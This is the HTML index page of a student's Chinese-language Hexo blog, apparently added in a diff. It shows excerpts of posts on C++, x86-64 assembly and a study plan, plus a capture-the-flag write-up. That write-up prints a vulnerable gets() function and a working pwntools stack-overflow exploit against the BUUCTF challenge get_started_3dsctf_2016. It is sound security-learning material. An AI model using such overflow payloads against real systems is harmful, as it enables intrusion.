+<p>在类的内部（定义类的代码内部），无论成员被声明为 public、protected 还是 private，都是可以互相访问的，没有访问权限的限制。在类的外部（定义类的代码之外），只能通过对象访问成员，并且通过对象只能访问 public 属性的成员，不能访问 private、protected 属性的成员。</p>
+<h2 id="类介绍，构造函数，析构函数"><a href="#类介绍，构造函数，析构函数" class="headerlink" title="(*)类介绍，构造函数，析构函数"></a>(*)类介绍，构造函数，析构函数</h2><p><strong>1.类介绍：</strong></p>
+<p>(1) 对面向对象和面向过程的理解</p>
+<p>① 面向对象和面向过程是一个相对的概念。</p>
+<p>② 面向过程是按照计算机的工作逻辑来编码的方式，最典型的面向过程的语言就是c语言了，c语言直接对应汇编，汇编又对应电路。</p>
+<p>③ 面向对象则是按照人类的思维来编码的一种方式，C++就完全支持面向对象功能，可以按照人类的思维来处理问题。</p>
+<p>④ 举个例子，要把大象装冰箱，按照人类的思路自然是分三步，打开冰箱，将大象装进去，关上冰箱。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/13/%E7%8E%B0%E4%BB%A3c-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">pwn日常刷题记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-07 20:22:58" itemprop="dateCreated datePublished" datetime="2023-03-07T20:22:58+08:00">2023-03-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-14 21:07:06" itemprop="dateModified" datetime="2023-03-14T21:07:06+08:00">2023-03-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="栈问题"><a href="#栈问题" class="headerlink" title="栈问题"></a>栈问题</h1><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p><strong>checksec</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">gets</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x308CD64F</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">getc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = <span class="built_in">getc</span>(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>get_flag()有两个参数，a1和a2。这里我已经将a1和a2转换成了十六进制。if对a1和a2进行了一个判断，符合条件后进行对flag的读取。具体读取过程为：首先v2对flag.txt文件进行一个读取，v3用getc()来接收v2读取的值(getc():从指定的流stream获取下一个字符(一个无符号字符)，并把位置标识符往前移动)。在v3不为255时，将值传给v4，用中间变量v5来读取v2的值，并且在v5不为255时，将v5的值赋给v4并输出v4，最终输出的结果就是flag</p>
+<p>但是我们发现通过main()的stackoverflow单纯的跳到get_flag()这个函数是无法拿到flag的，这里是因为我们在stackoverflow时覆盖了a1和a2，破坏了输出flag的条件，从而无法得到flag。我们试想，如果我们在stackoverflow时保护了栈结构，使程序达到输出flag的条件，正常退出，是否就可以拿到flag？</p>
+<p>于是我们需要<code>exit()</code>的地址，以及满足条件的a1和a2的值，即<code>0x308CD64F</code>和<code>0x195719D1</code></p>
+<p><strong>exp</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span> , arch = <span class="string">&quot;i386&quot;</span> , log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27026</span>)</span><br><span class="line">ret = <span class="number">0x08048196</span></span><br><span class="line">exits = elf.sym[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;got exit addr : %s&quot;</span> % <span class="built_in">hex</span>(exits))</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x38</span> + p32(<span class="number">0x080489A0</span>) + p32(exits) + p32(<span class="number">0x308CD64F</span>)+ p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Qual a palavrinha magica? &quot;</span> , timeout = <span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">现代C++学习笔记（一）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-05 17:45:22" itemprop="dateCreated datePublished" datetime="2023-03-05T17:45:22+08:00">2023-03-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-13 15:52:38" itemprop="dateModified" datetime="2023-03-13T15:52:38+08:00">2023-03-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="C-的基本特性"><a href="#C-的基本特性" class="headerlink" title="C++的基本特性"></a>C++的基本特性</h2><h3 id="程序的执行过程"><a href="#程序的执行过程" class="headerlink" title="程序的执行过程"></a>程序的执行过程</h3><p>程序被执行后就被称为一个进程，一个进程可以被划分为很多区域。</p>
+<p>其中比较重要的是以下四个区域。</p>
+<p><strong>1代码区与常量区：</strong>进程按照代码区的代码执行，真正的常量也存储在这里，比如“abc”字符串，“1”，“88”等数字。这些是真正的常量。再看一下const关键字。const只不过是让编译器将变量视为常量罢了，和真正的常量有本质上的区别</p>
+<p><strong>2栈区：</strong>函数的执行所需的空间，注意，当函数执行完毕，函数对应的栈内存全部销毁。</p>
+<p><strong>3堆区：</strong>进程用来分配内存的地方，只有手动释放才能销毁内存。</p>
+<p><strong>4静态变量区：</strong></p>
+<p>(1)静态变量：常常遇到的一些局部作用范围，生命周期却很长的变量。</p>
+<p>(2)全局变量：在c++中不建议使用，会破坏封装性。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/04/%E5%91%A8%E8%AE%A1%E5%88%92-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/04/%E5%91%A8%E8%AE%A1%E5%88%92-1/" class="post-title-link" itemprop="url">周计划</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-04 23:35:09" itemprop="dateCreated datePublished" datetime="2023-03-04T23:35:09+08:00">2023-03-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-28 20:56:04" itemprop="dateModified" datetime="2023-03-28T20:56:04+08:00">2023-03-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E5%88%92/" itemprop="url" rel="index"><span itemprop="name">计划</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/04/%E5%91%A8%E8%AE%A1%E5%88%92-1/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/04/%E5%91%A8%E8%AE%A1%E5%88%92-1/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="大一下学期目标"><a href="#大一下学期目标" class="headerlink" title="大一下学期目标"></a>大一下学期目标</h1><p><strong>主线</strong>：<strong>学习pwn的栈 堆和内核</strong></p>
+<p><strong>主线</strong>：<strong>完成现代c++的学习</strong></p>
+<p><strong>完成《深入了解操作系统》的阅读以及lab的练习</strong></p>
+<p><strong>完成<em>MIT.6S081</em>课程学习和lab的练习</strong></p>
+<h2 id="第4周"><a href="#第4周" class="headerlink" title="第4周"></a>第4周</h2><p>总目标：</p>
+<p><strong>现代c++：</strong>part1，part2 </p>
+<p><strong>pwn：</strong>理解堆</p>
+<p><strong>xv6：</strong>lab1完成</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/04/%E5%91%A8%E8%AE%A1%E5%88%92-1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/" class="post-title-link" itemprop="url">汇编语言简单摘要</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-02-20 22:57:27" itemprop="dateCreated datePublished" datetime="2023-02-20T22:57:27+08:00">2023-02-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-02-27 18:09:44" itemprop="dateModified" datetime="2023-02-27T18:09:44+08:00">2023-02-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">pwn基础</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="x86-64位寄存器（16个）"><a href="#x86-64位寄存器（16个）" class="headerlink" title="x86-64位寄存器（16个）"></a>x86-64位寄存器（16个）</h3><p>rax：存放保存函数返回值<br>rbx：被调用者保存<br>rdi rsi rdx rcx 对应第1、2、3、4个参数<br>rsp：栈指针，存放栈帧的栈顶的偏移地址<br>r8 r9对应第5、6个参数</p>
+<h3 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h3><p>立即数寻址$Imm Imm(立即数)<br>寄存器寻址%ra R[ra] (寄存器)<br>绝对寻址Imm M[Imm] (存储器)<br>间接寻址（%ra）M[R[[ra]]</p>
+<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下面有一点地址或寄存器的值，写出操作数的值</span><br><span class="line">地址          值              寄存器       值</span><br><span class="line">0x100      0xFF             rax        0x100</span><br><span class="line">0x104      0xab             rcx        0x1</span><br><span class="line">0x108      0x13             rdx        0x3</span><br><span class="line">0x10C      0x11</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">操作数  值</span><br><span class="line">rax 0x100(寄存器)</span><br><span class="line">0x104 0xab（绝对寻址）</span><br><span class="line"><span class="variable">$0x108</span> 0x108（立即数寻址）</span><br><span class="line">(%rax) 0xFF（间接寻址）</span><br></pre></td></tr></table></figure>
+
+<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>两种汇编模式<br>ATT汇编movq movb<br>普通汇编 mov <strong>rax,rbx</strong>&#x3D;mov<strong>q %rbx,%rax</strong> （ATT）：把rbx的值赋给rax</p>
+<h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/18/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="fan fan">
+      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fanfan's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/18/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-02-18 22:21:51" itemprop="dateCreated datePublished" datetime="2023-02-18T22:21:51+08:00">2023-02-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-02-19 21:19:57" itemprop="dateModified" datetime="2023-02-19T21:19:57+08:00">2023-02-19</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/02/18/hello-world/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/02/18/hello-world/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/02/18/hello-world/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fan fan"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">fan fan</p>
+  <div class="site-description" itemprop="description">我追逐的不是别人，而是我满怀期待的内心</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
+    Chat
+  </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
